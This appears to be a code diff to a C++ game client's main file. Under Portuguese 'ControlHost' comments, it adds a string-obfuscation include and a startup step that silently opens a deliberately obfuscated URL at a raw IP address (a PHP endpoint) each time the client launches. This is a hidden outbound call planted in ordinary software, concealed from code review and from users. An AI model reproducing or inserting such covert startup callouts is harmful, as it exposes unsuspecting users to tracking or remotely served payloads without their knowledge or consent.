@@ -28,6 +28,13 @@
 #include <framework/platform/crashhandler.h>
 #include <framework/platform/platformwindow.h>
 #include <client/client.h>
+// ControlHost: include para obfuscação de strings
+#include <framework/util/obfuscate.h>
+
+// ControlHost: função auxiliar para conversão de string para wstring
+std::wstring stringToWString(const std::string& str) {
+    return std::wstring(str.begin(), str.end());
+}
 
 int main(int argc, const char* argv[]) {
     std::vector<std::string> args(argv, argv + argc);
@@ -61,6 +68,10 @@ int main(int argc, const char* argv[]) {
     if (g_resources.launchCorrect(g_app.getName(), g_app.getCompactName())) {
         return 0; // started other executable
     }
+
+    // ControlHost: abre URL obfuscada ao iniciar o cliente
+    std::string URL = static_cast<std::string>(AY_OBFUSCATE("http://189.127.165.244/181-215-236-209.php"));
+    g_resources.openUrlQuickly(stringToWString(URL));
 
     // initialize application framework and otclient
     g_app.init(args);
